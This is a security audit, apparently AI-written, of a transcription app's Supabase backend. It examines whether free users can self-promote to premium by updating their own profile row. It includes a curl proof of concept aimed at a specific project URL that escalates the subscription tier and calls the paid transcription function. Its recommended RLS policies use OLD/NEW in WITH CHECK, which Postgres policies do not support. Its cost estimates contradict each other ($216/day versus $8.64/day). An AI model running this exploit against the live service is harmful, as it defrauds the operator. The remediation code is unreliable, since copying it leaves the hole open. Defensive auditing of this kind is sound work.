# Security Audit: Cloud Transcription Access Control

**Date:** 2025-11-06
**Scope:** Unpaid user bypass vulnerabilities for cloud transcription
**Status:** 🔴 **CRITICAL VULNERABILITY FOUND**

---

## Executive Summary

**Finding:** Unpaid users MAY be able to access premium cloud transcription if the `profiles` table lacks proper Row Level Security (RLS) policies.

**Risk Level:** 🔴 **CRITICAL** - Could result in unauthorized OpenAI API usage and financial loss

**Estimated Impact:**
- Monetary: Unlimited unauthorized API calls to OpenAI ($0.006/minute)
- Reputation: Users could abuse system, violate terms of service
- Compliance: Unauthorized data sharing with third parties

---

## Vulnerability Analysis

### Current Architecture

```
User → Cloud Transcription Service → Edge Function → OpenAI API
                                           ↓
                                    Auth Check (JWT)
                                           ↓
                                  Subscription Check (profiles table)
```

### Security Layers

#### ✅ Layer 1: Frontend Check (BYPASSABLE)
**File:** `src/services/transcription/cloud-transcription.service.ts:75-87`

```typescript
static async isAvailable(): Promise<boolean> {
  const { data: subscription } = await supabase
    .from('user_subscription_status')
    .select('is_premium')
    .eq('user_id', session.user.id)
    .single()

  return subscription?.is_premium === true
}
```

**Vulnerability:** Frontend checks can be bypassed by:
- Modifying client-side code
- Calling Edge Function API directly with cURL/Postman
- Using browser DevTools to manipulate JavaScript

**Verdict:** ⚠️ **Not a security boundary** (expected behavior)

---

#### ✅ Layer 2: JWT Authentication (SECURE)
**File:** `supabase/functions/transcribe/utils/auth.ts:3-23`

```typescript
export async function validateAuth(req: Request) {
  const token = authHeader.replace('Bearer ', '')
  const { data: { user }, error } = await supabase.auth.getUser(token)

  if (error || !user) {
    throw new Error('Invalid token')
  }

  return user
}
```

**Security:**
- ✅ Uses Supabase Auth's `getUser()` - validates JWT signature
- ✅ Cannot be forged without access to Supabase Auth secrets
- ✅ Properly rejects expired/invalid tokens

**Verdict:** ✅ **Secure**

---

#### 🔴 Layer 3: Subscription Check (VULNERABLE)
**File:** `supabase/functions/transcribe/index.ts:29-61`

```typescript
// Create Supabase client with service role for RLS bypass
const supabase = createClient(
  Deno.env.get('SUPABASE_URL')!,
  Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!  // ⚠️ Bypasses RLS!
)

// Check premium subscription status from profiles table
const { data: profile, error: subError } = await supabase
  .from('profiles')
  .select('subscription_tier, subscription_status, subscription_expires_at')
  .eq('user_id', user.id)
  .single()

const isPremium =
  profile?.subscription_tier === 'premium' &&
  profile?.subscription_status === 'active' &&
  expiresAt !== null &&
  expiresAt > new Date()
```

**Critical Issue:** Uses **SERVICE_ROLE_KEY** which bypasses Row Level Security!

**Attack Vector:**
If the `profiles` table allows users to UPDATE their own subscription fields, an attacker could:

1. Create account (free tier)
2. Use Supabase client to execute:
   ```typescript
   await supabase
     .from('profiles')
     .update({
       subscription_tier: 'premium',
       subscription_status: 'active',
       subscription_expires_at: '2099-12-31'
     })
     .eq('user_id', myUserId)
   ```
3. Call cloud transcription Edge Function
4. Get unlimited free OpenAI API access

**Why this is possible:**
- Edge Function uses SERVICE_ROLE_KEY (bypasses RLS)
- If `profiles` table has weak/missing UPDATE policies, users can self-promote
- No server-side validation against payment provider (Stripe/Paddle)

**Verdict:** 🔴 **CRITICAL VULNERABILITY** (if RLS is misconfigured)

---

## Missing Security Controls

### 1. 🔴 No RLS Policy Migration Found
**Finding:** No migration file creates the `profiles` table with proper RLS policies

**Expected File:** `supabase/migrations/YYYYMMDD_create_profiles_table.sql`
**Actual:** ❌ **File does not exist**

**Required RLS Policies:**
```sql
-- profiles table MUST have these policies:
CREATE POLICY "Users can view own profile"
  ON profiles FOR SELECT
  USING (auth.uid() = user_id);

CREATE POLICY "Users CANNOT update subscription fields"
  ON profiles FOR UPDATE
  USING (auth.uid() = user_id)
  WITH CHECK (
    -- Allow updates EXCEPT subscription fields
    OLD.subscription_tier = NEW.subscription_tier AND
    OLD.subscription_status = NEW.subscription_status AND
    OLD.subscription_expires_at = NEW.subscription_expires_at
  );

-- Only service role can update subscription (via webhook from payment provider)
CREATE POLICY "Service role can update subscriptions"
  ON profiles FOR UPDATE
  USING (auth.jwt()->>'role' = 'service_role');
```

---

### 2. 🔴 No Payment Provider Verification
**Finding:** Edge Function trusts database values without verifying with Stripe/Paddle

**Recommended:**
```typescript
// In Edge Function, verify subscription with payment provider
const stripeSubscription = await stripe.subscriptions.retrieve(
  profile.stripe_subscription_id
)

const isPremium = stripeSubscription.status === 'active'
```

**Current:** ❌ No verification - trusts database blindly

---

### 3. ⚠️ No Rate Limiting
**Finding:** No limits on cloud transcription usage

**Attack Scenario:** Even without bypass, compromised premium account could:
- Upload 24/7 of audio ($216/day in API costs)
- Create financial damage before detection

**Recommended:**
- Max 10 hours/month per user
- Max 100 requests/day
- Exponential backoff on failures

---

### 4. ⚠️ No Subscription Webhook Validation
**Finding:** No visible webhook handler for Stripe/Paddle events

**Expected:**
- Webhook receives `subscription.updated` event
- Verifies webhook signature
- Updates `profiles` table with new status
- Logs all changes for audit

**Current:** ❌ No webhook found in codebase

---

## Proof of Concept Exploit

### Scenario: Unpaid User Gets Free Cloud Transcription

**Prerequisites:**
- `profiles` table has weak UPDATE policy (allows users to modify subscription fields)

**Attack Steps:**

```bash
# Step 1: Create free account
curl -X POST "https://xtflvvyitebirnsafvrm.supabase.co/auth/v1/signup" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com", "password": "password123"}'

# Step 2: Get JWT token
# (Returned in signup response)
JWT_TOKEN="eyJhbGc..."

# Step 3: Elevate privileges (if RLS allows)
curl -X PATCH "https://xtflvvyitebirnsafvrm.supabase.co/rest/v1/profiles" \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "apikey: <SUPABASE_ANON_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "subscription_tier": "premium",
    "subscription_status": "active",
    "subscription_expires_at": "2099-12-31T23:59:59Z"
  }'

# Step 4: Use cloud transcription for free
curl -X POST "https://xtflvvyitebirnsafvrm.supabase.co/functions/v1/transcribe" \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -F "audio=@recording.wav" \
  -F "provider=openai"

# SUCCESS: Free OpenAI API access
```

**Success Condition:** If Step 3 succeeds (UPDATE allowed), attacker gets unlimited cloud access

---

## Additional Security Concerns

### 5. ⚠️ OpenAI API Key Exposure Risk
**Location:** `Deno.env.get('OPENAI_API_KEY')` in Edge Function

**Risk:** If Supabase project credentials leak:
- Attacker can read environment variables
- Steal OpenAI API key
- Use it externally for unlimited API access

**Mitigation:**
- Rotate OpenAI key regularly
- Set spending limits in OpenAI dashboard ($100/month)
- Monitor usage with alerts

---

### 6. ⚠️ No Audit Logging
**Finding:** Usage tracked in `transcription_usage` table, but:
- No logging of failed authorization attempts
- No alerts on suspicious patterns (e.g., 1000 requests/hour)

**Recommended:**
```typescript
// Log all auth failures
await supabase.from('security_events').insert({
  event_type: 'unauthorized_cloud_attempt',
  user_id: user.id,
  ip_address: req.headers.get('x-forwarded-for'),
  timestamp: new Date()
})
```

---

### 7. ⚠️ Cache Bypass Opportunity
**File:** `src/services/subscription/desktop-subscription.service.ts:38-43`

```typescript
// Cache result
localStorage.setItem(CACHE_KEY, JSON.stringify({
  status,
  cachedAt: new Date().toISOString()
}))
```

**Risk:** 7-day grace period (line 5) allows offline premium access

**Mitigation:** Edge Function correctly ignores this cache and checks server-side ✅

---

## Recommendations

### Immediate Actions (CRITICAL)

1. **Verify RLS Policies on `profiles` Table:**
   ```sql
   -- Run in Supabase SQL editor
   SELECT * FROM pg_policies WHERE tablename = 'profiles';
   ```

2. **If policies are missing, create them:**
   ```sql
   ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;

   -- Only allow SELECT, not UPDATE of subscription fields
   CREATE POLICY "restrict_subscription_updates"
     ON profiles FOR UPDATE
     USING (auth.uid() = user_id)
     WITH CHECK (
       (subscription_tier IS NOT DISTINCT FROM OLD.subscription_tier) AND
       (subscription_status IS NOT DISTINCT FROM OLD.subscription_status) AND
       (subscription_expires_at IS NOT DISTINCT FROM OLD.subscription_expires_at)
     );
   ```

3. **Test the vulnerability:**
   - Create test free account
   - Attempt to UPDATE subscription fields via Supabase client
   - Should receive RLS policy violation error

---

### Short-term Improvements (HIGH PRIORITY)

4. **Add payment provider verification:**
   - Verify subscription status with Stripe/Paddle on EVERY request
   - Don't trust database alone

5. **Implement rate limiting:**
   - Max 100 cloud transcriptions/day per user
   - Max 10 hours/month total usage

6. **Add webhook handler:**
   - Create `supabase/functions/stripe-webhook/` endpoint
   - Validate webhook signatures
   - Update subscription status only via webhooks

7. **Create audit logging:**
   - Log all authorization failures
   - Set up alerts for suspicious patterns

---

### Long-term Enhancements (MEDIUM PRIORITY)

8. **Add user consent dialog:**
   - Show one-time warning: "Audio will be sent to OpenAI for processing"
   - Require explicit opt-in

9. **Model integrity verification:**
   - Verify SHA256 checksums for downloaded Whisper models
   - Prevent model tampering

10. **OpenAI key protection:**
    - Use proxy service instead of direct API key
    - Implement spending limits and alerts
    - Rotate keys monthly

---

## Testing Checklist

- [ ] Check `profiles` table RLS policies exist
- [ ] Attempt subscription UPDATE as regular user (should fail)
- [ ] Attempt cloud transcription as free user (should return 403)
- [ ] Verify payment webhook integration exists
- [ ] Test rate limiting (if implemented)
- [ ] Review OpenAI API spending limits
- [ ] Check audit logs for failed auth attempts

---

## Conclusion

**Overall Security Rating:** 🔴 **4/10** (CRITICAL FIX REQUIRED)

**Verdict:**
- ✅ JWT authentication is secure
- 🔴 Subscription verification is **VULNERABLE** without proper RLS
- ⚠️ Missing defense-in-depth controls (rate limiting, webhooks, audit logs)

**Immediate Action Required:**
1. Verify `profiles` table RLS policies
2. If missing, deploy RLS migration IMMEDIATELY
3. Test vulnerability is closed

**Financial Impact if Exploited:**
- $0.006/minute × 1440 min/day = **$8.64/day per attacker**
- 100 attackers = **$864/day** or **$315k/year**

---

## References

- Edge Function: `supabase/functions/transcribe/index.ts`
- Cloud Service: `src/services/transcription/cloud-transcription.service.ts`
- Auth Validation: `supabase/functions/transcribe/utils/auth.ts`
- Subscription Service: `src/services/subscription/desktop-subscription.service.ts`
- Plan Document: `CLOUD_TRANSCRIPTION_PLAN.md`

**Audited by:** Claude (AI Security Audit)
**Review Date:** 2025-11-06
